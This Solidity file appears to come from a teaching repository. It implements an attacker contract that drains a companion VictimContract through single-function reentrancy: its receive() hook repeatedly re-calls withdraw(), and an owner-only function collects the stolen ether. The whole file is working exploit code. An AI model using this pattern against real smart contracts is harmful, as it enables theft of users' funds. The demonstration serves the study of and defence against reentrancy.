// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.9;

import './VictimContract.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

/**
 * @title Attacker contract
 * @author @NelsonRodMar.lens
 * @notice A that attack VictimContract.sol to show reentrancy attack on a Single Function
 */

contract AttackerContract is Ownable {
    VictimContract private victimContract;

    constructor(VictimContract _victimContract) public {
        victimContract = _victimContract;
    }

    // @notice We modify default receive function to stole funds from victim contract
    receive() external payable {
        if (address(victimContract).balance > 1 ether) {
            victimContract.withdraw();
        }
    }

    function attack() external {
        victimContract.withdraw();
    }

    function deposit() external payable {
        victimContract.stack{value : msg.value}();
    }


    function totalBalances() public view returns (uint256) {
        return address(this).balance;
    }


    function collectFunds() public onlyOwner {
        uint256 _amount = address(this).balance;
        (bool sent, bytes memory data) = msg.sender.call{value : _amount}("");
        require(sent, "Failed to send Ether");
    }
}
